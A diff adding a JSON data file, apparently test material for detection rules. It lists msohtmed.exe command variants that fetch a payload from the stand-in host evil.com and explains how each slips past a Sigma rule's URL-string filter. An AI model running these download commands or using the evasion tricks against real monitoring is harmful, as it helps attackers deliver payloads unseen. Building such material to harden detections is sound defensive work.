@@ -1,0 +1,22 @@
+[
+  {
+    "output": "msohtmed.exe HttPs://evil.com/payload.html",
+    "explanation": "Substitution technique. Modifies the casing of the URL protocol scheme to mixed case ('HttPs://'). The Sigma rule relies on a standard `CommandLine|contains` filter for literal strings 'http://' and 'https://'. In SIEM backends or log parsers where string queries default to case-sensitive evaluation, this will cleanly evade detection while the Windows web parsing subsystem evaluates the protocol case-insensitively."
+  },
+  {
+    "output": "msohtmed.exe https:\\\\evil.com\\payload.html",
+    "explanation": "Substitution technique. Replaces the standard URL forward slashes (`//`) following the protocol scheme with backslashes (`\\\\`). This alters the literal string to avoid the required `https://` or `http://` patterns, while the underlying Windows URLMON/WinINet components automatically normalize path slash directions back to valid network addresses during remote resource retrieval."
+  },
+  {
+    "output": "msohtmed.exe \"https://evil.com/payload.html\"",
+    "explanation": "Insertion technique. Encloses the target URL argument inside double quotation marks. Although this variation still contains the sequential string characters, it modifies the token boundary format, which is designed to evade fragile custom regex patterns, positional string indexes, or token-distance limits that explicitly assume unquoted inputs."
+  },
+  {
+    "output": "msohtmed.exe\thttps://evil.com/payload.html",
+    "explanation": "Insertion technique. Interjects a horizontal tab character (`\t`) instead of a standard space to separate the binary and its target URL argument. The Windows process execution engine transparently treats tab characters as valid parameter delimiters, but it can disrupt simplistic downstream string containment filters that strictly look for standard space buffers surrounding the file tokens."
+  },
+  {
+    "output": "",
+    "explanation": "Omission technique note: Complete omission or encoding of the protocol scheme prefix (such as hiding the scheme name via environment variables directly on the native shell command line) is not safely supported by the application's internal network handling routines without failing the destination target resolution."
+  }
+]
